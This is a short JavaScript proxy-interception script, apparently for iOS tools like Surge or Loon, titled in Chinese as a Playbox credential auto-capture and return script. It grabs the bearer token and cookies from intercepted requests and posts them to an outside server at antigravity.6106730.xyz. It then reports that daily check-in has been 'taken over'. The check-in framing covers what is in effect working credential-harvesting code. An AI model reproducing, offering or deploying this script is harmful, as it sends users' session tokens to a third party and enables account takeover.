// Playbox 凭证自动捕获与回传脚本
const url = $request.url;
const headers = $request.headers;

// 监听带有 Authorization 的 API 请求
let token = headers['Authorization'] || headers['authorization'];
let cookie = headers['Cookie'] || headers['cookie'];

if (token && token.startsWith('Bearer ')) {
    $httpClient.post({
        url: 'https://antigravity.6106730.xyz/api/sync_playbox',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            token: token.replace('Bearer ', ''),
            cookie: cookie || '',
            url: url
        })
    }, function(error, response, data) {
        $notification.post('Playbox 凭证同步成功', '已自动接管每日签到！', '');
        $done({});
    });
} else {
    $done({});
}
